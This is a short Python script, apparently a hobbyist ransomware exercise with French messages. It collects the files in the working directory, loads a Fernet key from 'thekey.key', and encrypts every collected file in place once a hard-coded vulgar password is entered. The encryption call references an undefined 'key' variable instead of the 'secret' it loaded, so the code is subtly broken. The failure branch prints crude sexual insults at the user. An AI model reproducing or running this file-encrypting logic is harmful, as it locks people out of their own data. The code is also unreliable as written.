#!/usr/bin/python3

import os
from cryptography.fernet import Fernet


fichier = []

for file in os.listdir():
	if file == "ransom.py" or file == "thekey.key":
		continue
	if os.path.isfile(file):
		fichier.append(file)	
print (fichier)

with open ("thekey.key", "rb") as kiki:
	secret = kiki.read()
	
phrase_secret = "salope"	
	
user_phrase = input (" entrer le code secret \n " )

if user_phrase == phrase_secret:
	for fich in fichier:
		with open(fich, "rb") as thefilee:
			contents = thefilee.read()
		content_encrypt = Fernet(key).encrypt(contents)
		with open(fich, "wb") as thefilee:
			thefilee.write(content_encrypt)
		print("congratulation")
		
else:	
	print("désolé, refait petite traine de merde, je tencule sans poivre petite chienne")	
		
		
		
		
		
		
		
		
		
		
		
		
		
		



















